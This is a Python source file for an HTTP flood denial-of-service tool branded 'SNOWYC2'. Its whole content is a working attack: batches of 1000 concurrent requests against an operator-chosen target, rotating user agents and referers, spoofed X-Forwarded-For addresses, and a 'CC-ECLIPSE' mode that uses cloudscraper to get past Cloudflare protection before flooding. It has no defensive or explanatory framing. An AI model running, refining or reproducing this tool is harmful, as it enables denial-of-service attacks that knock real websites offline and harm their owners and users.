import asyncio
import aiohttp
import cloudscraper
import random
import sys
import os
import time
import psutil
from datetime import datetime

# Load user agents and referers from file
def load_lines(filename):
    if os.path.exists(filename):
        with open(filename, "r") as f:
            return [line.strip() for line in f if line.strip()]
    return []

USER_AGENTS = load_lines("uas.txt")
REFERERS = load_lines("refs.txt")

MAX_CONCURRENT = 1000
REQUEST_TIMEOUT = 10

class AttackEngine:
    def __init__(self, method, target, duration):
        self.method = method
        self.target = target if target.startswith("http") else f"http://{target}"
        self.duration = duration
        self.stats = {
            'total': 0,
            'success': 0,
            'errors': 0,
            'rps': 0,
            'peak_rps': 0,
            'start_time': time.time()
        }
        self.headers = {}
        self.cookies = {}

    async def run(self):
        if self.method == "C-ECLIPSE":
            await self.c_eclipse()
        elif self.method == "CC-ECLIPSE":
            await self.cc_eclipse()

    async def cc_eclipse(self):
        try:
            scraper = cloudscraper.create_scraper()
            resp = scraper.get(self.target, timeout=REQUEST_TIMEOUT)
            if resp.status_code == 200:
                self.cookies = scraper.cookies.get_dict()
                self.headers = dict(resp.request.headers)
            else:
                print(f"[CC-ECLIPSE] Bypass failed with status {resp.status_code}")
                return
        except Exception as e:
            print(f"[CC-ECLIPSE] cloudscraper error: {e}")
            return

        async with aiohttp.ClientSession(cookies=self.cookies) as session:
            await self.flood(session)

    async def c_eclipse(self):
        async with aiohttp.ClientSession() as session:
            await self.flood(session)

    async def flood(self, session):
        end_time = self.stats['start_time'] + self.duration
        while time.time() < end_time:
            tasks = [self.make_request(session) for _ in range(MAX_CONCURRENT)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            self.update_stats(results)
            self.print_status()
            await asyncio.sleep(0.5)
        self.print_summary()

    async def make_request(self, session):
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Referer": random.choice(REFERERS),
            "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
        }
        headers.update(self.headers)

        try:
            async with session.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT) as response:
                if response.status == 200:
                    return "SUCCESS"
                elif str(response.status).startswith('4'):
                    return "ERROR"
                return "OTHER"
        except:
            return "ERROR"

    def update_stats(self, results):
        self.stats['total'] += len(results)
        self.stats['success'] += results.count("SUCCESS")
        self.stats['errors'] += results.count("ERROR")
        elapsed = time.time() - self.stats['start_time']
        rps = self.stats['total'] / elapsed if elapsed > 0 else 0
        self.stats['rps'] = rps
        self.stats['peak_rps'] = max(self.stats['peak_rps'], rps)

    def print_status(self):
        elapsed = time.time() - self.stats['start_time']
        remaining = max(0, self.duration - elapsed)
        ram = psutil.virtual_memory()
        used_gb = ram.used / (1024 ** 3)

        sys.stdout.write("\033[H\033[J")
        print("SNOWYC2 - T.ME/STSVKINGDOM")
        print("=" * 60)
        print(f" METHOD: {self.method} | TARGET: {self.target}")
        print(f" TIME: {self.duration}s | TIME LEFT: {remaining:.1f}s")
        print(f" REQUESTS: {self.stats['total']} | SUCCESS: {self.stats['success']} | ERRORS: {self.stats['errors']}")
        print(f" RPS: {self.stats['rps']:.1f} | PEAK RPS: {self.stats['peak_rps']:.1f}")
        print(f" RAM USED: {used_gb:.2f} GB")
        print("=" * 60)

    def print_summary(self):
        total_time = time.time() - self.stats['start_time']
        avg_rps = self.stats['total'] / total_time if total_time > 0 else 0
        print("\nATTACK FINISHED")
        print("=" * 60)
        print(f" TARGET: {self.target}")
        print(f" DURATION: {total_time:.1f}s")
        print(f" TOTAL REQUESTS: {self.stats['total']}")
        print(f" SUCCESS (200): {self.stats['success']}")
        print(f" ERRORS (4xx): {self.stats['errors']}")
        print(f" AVG RPS: {avg_rps:.1f}")
        print("=" * 60)

def main():
    print("SNOWYC2 - T.ME/STSVKINGDOM")
    print("=" * 40)
    method = input("METHOD (C-ECLIPSE / CC-ECLIPSE): ").strip().upper()
    target = input("TARGET: ").strip()
    duration = int(input("TIME (seconds): ").strip())

    engine = AttackEngine(method, target, duration)
    try:
        asyncio.run(engine.run())
    except KeyboardInterrupt:
        print("\n[Stopped by user]")
    except Exception as e:
        print(f"\nError: {e}")

if __name__ == "__main__":
    main()
